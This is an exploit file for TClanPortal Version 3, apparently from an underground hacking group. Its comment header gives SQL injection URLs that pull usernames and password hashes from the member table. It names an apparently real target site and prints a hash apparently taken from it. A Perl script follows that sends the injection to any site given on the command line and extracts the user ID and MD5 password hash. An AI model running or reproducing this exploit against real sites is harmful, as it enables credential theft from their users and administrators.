# TClanPortal Version 3 ..
# Search By Google :-
# by TriggerTG.de 2003 - Version 3
#
# Gr33tz :-
#         Abducter .. SQL Injection's FOunder   - | abducter_minds76@hotmail.com |-
#         Devil-00 .. SQL Injection's Exploting - | devil-00@s4a.cc | -
#         Security4Arab .. A'Where Home .. WE LOVE S4A FOR EVER :P
#         HACKERS PAL ..
#         Yes2Hack ..
#         WwW.Sqor.NeT
#         WwW.S4a.Cc
#         WwW.SecurityGurus.NeT
#
#
#
# This Injection's Whene Prefix = "";
#
# 1- SQL Injection
# /ClanPortal/linkdl/index.php?action=relatedlink&id=-1%20UNION%20SELECT%20pw,name,null,name,name,name%20FROM%20member%20%20WHERE%20id=1/*
# http://yahzee.ya.funpic.de/ClanPortal/
#
# Richard
# d38b89019f0496a4e67bfbe95cbcba0f    - MD5
#
# 2- SQL Injection
# /linkdl/index.php?action=bewerten&id=-1%20UNION%20SELECT%20pw,null,null%20FROM%20member%20%20WHERE%20id=1/*
# [!] GET Password
#
#
# /linkdl/index.php?action=bewerten&id=-1%20UNION%20SELECT%20name,null,null%20FROM%20member%20%20WHERE%20id=1/*
# [!] GET Username
#
# [!] Perl Code By Devil-00 | devil-00@s4a.cc |
#------------------------------------------------------------------------------------------------------------

use LWP::Simple;

print "\n\n==========================================\n";
print "\n= Exploit for TClanPortal Version 3            ";
print "\n= Coded By Devil-00 | devil-00@s4a.cc |        ";
print "\n= Gr33tz :-                                                            ";
print "\n= Abducter .. SQL Injection's FOunder   - | abducter_minds76@hotmail.com |-            ";
print "\n= Devil-00 .. SQL Injection's Exploting - | devil-00@s4a.cc | -        ";
print "\n= Security4Arab .. A'Where Home .. WE LOVE S4A FOR EVER :P             ";
print "\n= HACKERS PAL ..                                                       ";
print "\n= Yes2Hack ..                                                          ";
print "\n= WwW.Sqor.NeT                                                         ";
print "\n= WwW.S4a.Cc                                                           ";
print "\n= WwW.SecurityGurus.NeT                                        ";
print "\n============================================\n\n";

if(!$ARGV[0] or !$ARGV[1]) {
   print "Usage:\nperl $0 [Full-Path] [SQL Prefix] [User ID]\n\nExample:\nperl $0 http://yahzee.ya.funpic.de/ClanPortal/ 1\n";
   exit(0);
}
$url = "/linkdl/index.php?action=relatedlink&id=-1%20UNION%20SELECT%20pw,name,null,name,name,name%20FROM%20member%20%20WHERE%20id=$ARGV[1]/*";
$page = get($ARGV[0].$url) || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $ARGV[0]\n";
$page =~ m/<a href='(.*?)' target='_parent'>/ && print "[+] User ID is: $1\n";
print "[-] Unable to retrieve User ID\n" if(!$1);
$page =~ m/<b>Name:<\/b> <a href='index\.php\?action=kat&id=0'>(.*?)<\/a>/ && print "[+] MD5 hash of password is: $1\n";
print "[-] Unable to retrieve hash of password\n" if(!$1);